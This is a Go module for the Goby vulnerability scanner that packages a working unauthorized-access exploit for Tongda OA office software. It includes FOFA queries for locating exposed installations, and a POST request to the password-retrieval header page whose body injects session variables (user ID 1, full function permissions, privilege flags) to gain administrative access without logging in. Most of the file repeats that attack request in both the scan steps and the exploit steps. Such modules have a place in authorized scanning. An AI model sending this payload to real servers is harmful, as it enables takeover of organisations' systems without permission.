package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Tongda OA Unauthorized Access Vulnerability",
    "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices.</p><p>Tongda OA has an unauthorized access vulnerability. An attacker can take control of the entire system through unauthorized access vulnerabilities, resulting in an extremely insecure state of the system.</p>",
    "Product": "Tongda OA",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2022-08-04",
    "Author": "twcjw",
    "FofaQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Level": "3",
    "Impact": "<p>Tongda OA has an unauthorized access vulnerability. An attacker can take control of the entire system through unauthorized access vulnerabilities, resulting in an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/module/retrieve_pwd/header.inc.php",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "找回OA登录密码",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "禁止",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "禁止访问",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/module/retrieve_pwd/header.inc.php",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "_SESSION%5BLOGIN_THEME%5D=15&_SESSION%5BLOGIN_USER_ID%5D=1&_SESSION%5BLOGIN_UID%5D%3D1%26_SESSION%5BLOGIN_FUNC_STR%5D=1%2C3%2C42%2C643%2C644%2C634%2C4%2C147%2C148%2C7%2C8%2C9%2C10%2C16%2C11%2C130%2C5%2C131%2C132%2C256%2C229%2C182%2C183%2C194%2C637%2C134%2C37%2C135%2C136%2C226%2C253%2C254%2C255%2C536%2C24%2C196%2C105%2C119%2C80%2C96%2C97%2C98%2C114%2C126%2C179%2C607%2C539%2C251%2C127%2C238%2C128%2C85%2C86%2C87%2C88%2C89%2C137%2C138%2C222%2C90%2C91%2C92%2C152%2C93%2C94%2C95%2C118%2C237%2C108%2C109%2C110%2C112%2C51%2C53%2C54%2C153%2C217%2C150%2C239%2C240%2C218%2C219%2C43%2C17%2C18%2C19%2C15%2C36%2C70%2C76%2C77%2C115%2C116%2C185%2C235%2C535%2C59%2C133%2C64%2C257%2C2%2C74%2C12%2C68%2C66%2C67%2C13%2C14%2C40%2C41%2C44%2C75%2C27%2C60%2C61%2C481%2C482%2C483%2C484%2C485%2C486%2C487%2C488%2C489%2C490%2C491%2C492%2C120%2C494%2C495%2C496%2C497%2C498%2C499%2C500%2C501%2C502%2C503%2C505%2C504%2C26%2C506%2C507%2C508%2C515%2C537%2C122%2C123%2C124%2C628%2C125%2C630%2C631%2C632%2C633%2C55%2C514%2C509%2C29%2C28%2C129%2C510%2C511%2C224%2C39%2C512%2C513%2C252%2C230%2C231%2C232%2C629%2C233%2C234%2C461%2C462%2C463%2C464%2C465%2C466%2C467%2C468%2C469%2C470%2C471%2C472%2C473%2C474%2C475%2C200%2C202%2C201%2C203%2C204%2C205%2C206%2C207%2C208%2C209%2C65%2C187%2C186%2C188%2C189%2C190%2C191%2C606%2C192%2C193%2C221%2C550%2C551%2C73%2C62%2C63%2C34%2C532%2C548%2C640%2C641%2C642%2C549%2C601%2C600%2C602%2C603%2C604%2C46%2C21%2C22%2C227%2C56%2C30%2C31%2C33%2C32%2C605%2C57%2C609%2C103%2C146%2C107%2C197%2C228%2C58%2C538%2C151%2C6%2C534%2C69%2C71%2C72%2C223%2C639%2C225%2C236%2C78%2C178%2C104%2C121%2C149%2C84%2C99%2C100%2C533%2C101%2C113%2C198%2C540%2C626%2C638%2C38%2C&_SESSION%5BLOGIN_USER_PRIV%5D=1&_SESSION%5BLOGIN_USER_PRIV_OTHER%5D=1&_SESSION%5BLOGIN_USER_PRIV_TYPE%5D=1&_SESSION%5BLOGIN_NOT_VIEW_USER%5D=0&_SESSION%5BRETRIEVE_PWD_USER%5D=20s"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "找回OA登录密码",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "禁止访问",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "禁止",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/module/retrieve_pwd/header.inc.php",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "找回OA登录密码",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "禁止",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "禁止访问",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/module/retrieve_pwd/header.inc.php",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "_SESSION%5BLOGIN_THEME%5D=15&_SESSION%5BLOGIN_USER_ID%5D=1&_SESSION%5BLOGIN_UID%5D%3D1%26_SESSION%5BLOGIN_FUNC_STR%5D=1%2C3%2C42%2C643%2C644%2C634%2C4%2C147%2C148%2C7%2C8%2C9%2C10%2C16%2C11%2C130%2C5%2C131%2C132%2C256%2C229%2C182%2C183%2C194%2C637%2C134%2C37%2C135%2C136%2C226%2C253%2C254%2C255%2C536%2C24%2C196%2C105%2C119%2C80%2C96%2C97%2C98%2C114%2C126%2C179%2C607%2C539%2C251%2C127%2C238%2C128%2C85%2C86%2C87%2C88%2C89%2C137%2C138%2C222%2C90%2C91%2C92%2C152%2C93%2C94%2C95%2C118%2C237%2C108%2C109%2C110%2C112%2C51%2C53%2C54%2C153%2C217%2C150%2C239%2C240%2C218%2C219%2C43%2C17%2C18%2C19%2C15%2C36%2C70%2C76%2C77%2C115%2C116%2C185%2C235%2C535%2C59%2C133%2C64%2C257%2C2%2C74%2C12%2C68%2C66%2C67%2C13%2C14%2C40%2C41%2C44%2C75%2C27%2C60%2C61%2C481%2C482%2C483%2C484%2C485%2C486%2C487%2C488%2C489%2C490%2C491%2C492%2C120%2C494%2C495%2C496%2C497%2C498%2C499%2C500%2C501%2C502%2C503%2C505%2C504%2C26%2C506%2C507%2C508%2C515%2C537%2C122%2C123%2C124%2C628%2C125%2C630%2C631%2C632%2C633%2C55%2C514%2C509%2C29%2C28%2C129%2C510%2C511%2C224%2C39%2C512%2C513%2C252%2C230%2C231%2C232%2C629%2C233%2C234%2C461%2C462%2C463%2C464%2C465%2C466%2C467%2C468%2C469%2C470%2C471%2C472%2C473%2C474%2C475%2C200%2C202%2C201%2C203%2C204%2C205%2C206%2C207%2C208%2C209%2C65%2C187%2C186%2C188%2C189%2C190%2C191%2C606%2C192%2C193%2C221%2C550%2C551%2C73%2C62%2C63%2C34%2C532%2C548%2C640%2C641%2C642%2C549%2C601%2C600%2C602%2C603%2C604%2C46%2C21%2C22%2C227%2C56%2C30%2C31%2C33%2C32%2C605%2C57%2C609%2C103%2C146%2C107%2C197%2C228%2C58%2C538%2C151%2C6%2C534%2C69%2C71%2C72%2C223%2C639%2C225%2C236%2C78%2C178%2C104%2C121%2C149%2C84%2C99%2C100%2C533%2C101%2C113%2C198%2C540%2C626%2C638%2C38%2C&_SESSION%5BLOGIN_USER_PRIV%5D=1&_SESSION%5BLOGIN_USER_PRIV_OTHER%5D=1&_SESSION%5BLOGIN_USER_PRIV_TYPE%5D=1&_SESSION%5BLOGIN_NOT_VIEW_USER%5D=0&_SESSION%5BRETRIEVE_PWD_USER%5D=20s"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "找回OA登录密码",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "禁止访问",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "禁止",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|_SESSION%5BLOGIN_THEME%5D=15&_SESSION%5BLOGIN_USER_ID%5D=1&_SESSION%5BLOGIN_UID%5D%3D1%26_SESSION%5BLOGIN_FUNC_STR%5D=1%2C3%2C42%2C643%2C644%2C634%2C4%2C147%2C148%2C7%2C8%2C9%2C10%2C16%2C11%2C130%2C5%2C131%2C132%2C256%2C229%2C182%2C183%2C194%2C637%2C134%2C37%2C135%2C136%2C226%2C253%2C254%2C255%2C536%2C24%2C196%2C105%2C119%2C80%2C96%2C97%2C98%2C114%2C126%2C179%2C607%2C539%2C251%2C127%2C238%2C128%2C85%2C86%2C87%2C88%2C89%2C137%2C138%2C222%2C90%2C91%2C92%2C152%2C93%2C94%2C95%2C118%2C237%2C108%2C109%2C110%2C112%2C51%2C53%2C54%2C153%2C217%2C150%2C239%2C240%2C218%2C219%2C43%2C17%2C18%2C19%2C15%2C36%2C70%2C76%2C77%2C115%2C116%2C185%2C235%2C535%2C59%2C133%2C64%2C257%2C2%2C74%2C12%2C68%2C66%2C67%2C13%2C14%2C40%2C41%2C44%2C75%2C27%2C60%2C61%2C481%2C482%2C483%2C484%2C485%2C486%2C487%2C488%2C489%2C490%2C491%2C492%2C120%2C494%2C495%2C496%2C497%2C498%2C499%2C500%2C501%2C502%2C503%2C505%2C504%2C26%2C506%2C507%2C508%2C515%2C537%2C122%2C123%2C124%2C628%2C125%2C630%2C631%2C632%2C633%2C55%2C514%2C509%2C29%2C28%2C129%2C510%2C511%2C224%2C39%2C512%2C513%2C252%2C230%2C231%2C232%2C629%2C233%2C234%2C461%2C462%2C463%2C464%2C465%2C466%2C467%2C468%2C469%2C470%2C471%2C472%2C473%2C474%2C475%2C200%2C202%2C201%2C203%2C204%2C205%2C206%2C207%2C208%2C209%2C65%2C187%2C186%2C188%2C189%2C190%2C191%2C606%2C192%2C193%2C221%2C550%2C551%2C73%2C62%2C63%2C34%2C532%2C548%2C640%2C641%2C642%2C549%2C601%2C600%2C602%2C603%2C604%2C46%2C21%2C22%2C227%2C56%2C30%2C31%2C33%2C32%2C605%2C57%2C609%2C103%2C146%2C107%2C197%2C228%2C58%2C538%2C151%2C6%2C534%2C69%2C71%2C72%2C223%2C639%2C225%2C236%2C78%2C178%2C104%2C121%2C149%2C84%2C99%2C100%2C533%2C101%2C113%2C198%2C540%2C626%2C638%2C38%2C&_SESSION%5BLOGIN_USER_PRIV%5D=1&_SESSION%5BLOGIN_USER_PRIV_OTHER%5D=1&_SESSION%5BLOGIN_USER_PRIV_TYPE%5D=1&_SESSION%5BLOGIN_NOT_VIEW_USER%5D=0&_SESSION%5BRETRIEVE_PWD_USER%5D=20s"
            ]
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.1",
    "Translation": {
        "CN": {
            "Name": "通达OA 未授权访问漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><p>通达OA 存在未授权访问漏洞。攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>通达OA 存在未授权访问漏洞。攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Tongda OA Unauthorized Access Vulnerability",
            "Product": "Tongda OA",
            "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices.</p><p>Tongda OA has an unauthorized access vulnerability. An attacker can take control of the entire system through unauthorized access vulnerabilities, resulting in an extremely insecure state of the system.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Tongda OA has an unauthorized access vulnerability. An attacker can take control of the entire system through unauthorized access vulnerabilities, resulting in an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
